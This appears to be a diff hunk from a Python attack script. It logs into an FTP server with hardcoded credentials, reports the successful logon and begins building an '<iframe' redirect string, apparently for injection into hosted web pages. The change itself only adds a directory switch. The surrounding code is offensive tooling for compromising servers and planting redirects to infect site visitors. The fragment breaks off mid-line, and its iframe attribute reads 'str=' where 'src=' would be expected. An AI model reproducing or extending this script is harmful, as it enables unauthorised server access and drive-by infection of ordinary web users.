@@ -14,6 +14,7 @@ userName = 'philip'
 passWord = 'philip'
 ftp = ftplib.FTP(host)
 ftp.login(userName, passWord)
+ftp.cwd('ftp')
 print('\n[*] ' + str(host) +\
     ' FTP Logon Succeeded: '+userName+"/"+passWord)
 redirect = '<iframe str='+\
